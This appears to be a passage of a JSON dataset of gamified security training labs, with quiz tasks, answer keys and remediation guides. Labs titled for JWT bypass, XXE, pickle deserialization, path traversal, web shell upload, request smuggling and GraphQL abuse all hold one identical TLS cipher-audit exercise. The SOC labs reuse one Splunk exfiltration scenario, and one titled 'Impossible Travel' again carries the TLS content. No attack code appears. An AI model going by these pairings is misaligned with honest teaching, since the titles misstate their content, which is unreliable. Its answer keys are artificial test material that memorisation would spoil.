        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-008",
    "category": "Web Application Security & OWASP",
    "title": "JWT None Algorithm & Insecure Signature Verification Bypass",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 170,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-009",
    "category": "Web Application Security & OWASP",
    "title": "XML External Entity (XXE) Arbitrary File Read Injection",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-010",
    "category": "Web Application Security & OWASP",
    "title": "Insecure Deserialization & Python Pickle Arbitrary Code Execution",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 210,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-011",
    "category": "Web Application Security & OWASP",
    "title": "Path Traversal & Local File Inclusion (/etc/passwd)",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 120,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-012",
    "category": "Web Application Security & OWASP",
    "title": "Remote Code Execution via Unrestricted Web Shell File Upload",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-013",
    "category": "Web Application Security & OWASP",
    "title": "HTTP Request Smuggling (CL.TE Desync Attack)",
    "difficulty": "Advanced",
    "timeEst": "22 min",
    "xpReward": 240,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-web-014",
    "category": "Web Application Security & OWASP",
    "title": "GraphQL Introspection & Field Query Rate Limit Abuse",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-001",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Splunk Querying for Lateral Movement & Remote Desktop (RDP)",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Tactical Security Operations Center (SOC) sensors flagged a high-severity alert. Analyze the log stream, isolate malicious indicators of compromise (IOCs), and write detection logic.",
    "telemetry": "index=firewall action=allowed dest_port=443\n| stats count by src_ip, dest_ip, bytes_out\n| where bytes_out > 500000000\nAlert: Endpoint 10.0.10.45 uploaded 512MB to 198.51.100.88 over TLS.\nEDR Correlation: Process PID 1892 (powershell.exe) established connection. Parent PID: 402 (excel.exe).",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What source IP address was responsible for the high-volume outbound data transfer?",
        "expected": "10.0.10.45",
        "acceptedKeywords": [
          "10.0.10.45"
        ],
        "hint": "src_ip in the query output.",
        "explanation": "Expected: 10.0.10.45. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What external destination IP address received the 512MB transmission?",
        "expected": "198.51.100.88",
        "acceptedKeywords": [
          "198.51.100.88"
        ],
        "hint": "dest_ip field.",
        "explanation": "Expected: 198.51.100.88. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What parent process executed powershell.exe according to EDR correlation?",
        "expected": "excel.exe",
        "acceptedKeywords": [
          "excel.exe",
          "Microsoft Excel"
        ],
        "hint": "Parent image indicating a macro attack.",
        "explanation": "Expected: excel.exe. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What port was used for the egress connection?",
        "expected": "443",
        "acceptedKeywords": [
          "443",
          "HTTPS",
          "TCP 443"
        ],
        "hint": "Standard TLS web port.",
        "explanation": "Expected: 443. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. In SIEM architecture, what tier collects, parses, and normalizes raw log data?",
        "expected": "Log Ingestion / Parser",
        "acceptedKeywords": [
          "Log Ingestion",
          "Forwarder",
          "Parser",
          "Ingestion"
        ],
        "hint": "First stage of the SIEM pipeline.",
        "explanation": "Expected: Log Ingestion / Parser. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What metric in SOC operations measures the average time elapsed between alert detection and threat containment?",
        "expected": "MTTR",
        "acceptedKeywords": [
          "MTTR",
          "Mean Time To Respond",
          "Mean Time To Remediate"
        ],
        "hint": "Mean Time to Respond / Remediate.",
        "explanation": "Expected: MTTR. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Isolate host 10.0.10.45 immediately via EDR, terminate PID 1892, block external IP 198.51.100.88 on perimeter firewalls, and initiate incident response triage."
  },
  {
    "id": "lab-soc-002",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Elastic SIEM KQL Hunting for Base64 Encoded PowerShell Commands",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Tactical Security Operations Center (SOC) sensors flagged a high-severity alert. Analyze the log stream, isolate malicious indicators of compromise (IOCs), and write detection logic.",
    "telemetry": "index=firewall action=allowed dest_port=443\n| stats count by src_ip, dest_ip, bytes_out\n| where bytes_out > 500000000\nAlert: Endpoint 10.0.10.45 uploaded 512MB to 198.51.100.88 over TLS.\nEDR Correlation: Process PID 1892 (powershell.exe) established connection. Parent PID: 402 (excel.exe).",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What source IP address was responsible for the high-volume outbound data transfer?",
        "expected": "10.0.10.45",
        "acceptedKeywords": [
          "10.0.10.45"
        ],
        "hint": "src_ip in the query output.",
        "explanation": "Expected: 10.0.10.45. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What external destination IP address received the 512MB transmission?",
        "expected": "198.51.100.88",
        "acceptedKeywords": [
          "198.51.100.88"
        ],
        "hint": "dest_ip field.",
        "explanation": "Expected: 198.51.100.88. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What parent process executed powershell.exe according to EDR correlation?",
        "expected": "excel.exe",
        "acceptedKeywords": [
          "excel.exe",
          "Microsoft Excel"
        ],
        "hint": "Parent image indicating a macro attack.",
        "explanation": "Expected: excel.exe. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What port was used for the egress connection?",
        "expected": "443",
        "acceptedKeywords": [
          "443",
          "HTTPS",
          "TCP 443"
        ],
        "hint": "Standard TLS web port.",
        "explanation": "Expected: 443. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. In SIEM architecture, what tier collects, parses, and normalizes raw log data?",
        "expected": "Log Ingestion / Parser",
        "acceptedKeywords": [
          "Log Ingestion",
          "Forwarder",
          "Parser",
          "Ingestion"
        ],
        "hint": "First stage of the SIEM pipeline.",
        "explanation": "Expected: Log Ingestion / Parser. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What metric in SOC operations measures the average time elapsed between alert detection and threat containment?",
        "expected": "MTTR",
        "acceptedKeywords": [
          "MTTR",
          "Mean Time To Respond",
          "Mean Time To Remediate"
        ],
        "hint": "Mean Time to Respond / Remediate.",
        "explanation": "Expected: MTTR. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Isolate host 10.0.10.45 immediately via EDR, terminate PID 1892, block external IP 198.51.100.88 on perimeter firewalls, and initiate incident response triage."
  },
  {
    "id": "lab-soc-003",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Threat Hunting: Impossible Travel & Geolocation Anomalies",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
